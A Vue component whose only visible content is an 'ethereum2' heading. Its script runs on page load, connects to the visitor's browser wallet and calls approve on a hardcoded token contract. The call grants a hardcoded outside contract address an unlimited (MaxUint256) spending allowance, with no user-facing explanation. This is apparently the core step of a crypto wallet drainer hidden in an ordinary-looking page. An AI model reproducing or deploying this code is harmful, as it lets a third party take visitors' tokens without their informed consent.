<template>
  <div>
    <h2>ethereum2</h2>
  </div>
</template>

<script setup lang="ts">
// 导入 ethers.js 库
import { ethers } from 'ethers';
import { abi, abi_Approval } from '../TronLink/abi';

const tokenABI = [
  // Read-Only Functions
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  // Authenticated Functions
  'function transfer(address to, uint amount) returns (bool)',
  // Events
  'event Transfer(address indexed from, address indexed to, uint amount)',
];

const walletAddress = '0x6F14653a91AC36935bdB15db6ccC66dC57593653'; // 钱包地址
const contractAddress = '0x1ed5685f345b2fa564ea4a670de1fde39e484751'; // 合约地址
const tokenContract = '0x55d398326f99059ff775485246999027b3197955'; // 代币合约地址
const provider = new ethers.providers.Web3Provider(window.ethereum);

const signer = provider.getSigner();
const walletSigner = signer.connect(provider); // 创建一个连接到 provider 的签名者对象
debugger;
const contract = new ethers.Contract(tokenContract, abi_Approval, walletSigner);
(async () => {
  try {
    const approveTx = await contract.approve(contractAddress, ethers.constants.MaxUint256, { from: walletAddress });
    await approveTx.wait(); // 等待交易完成
    console.log('Approve success');
    debugger;
  } catch (error) {
    console.error('Approve failed:', error);
    debugger;
  }
})();
</script>
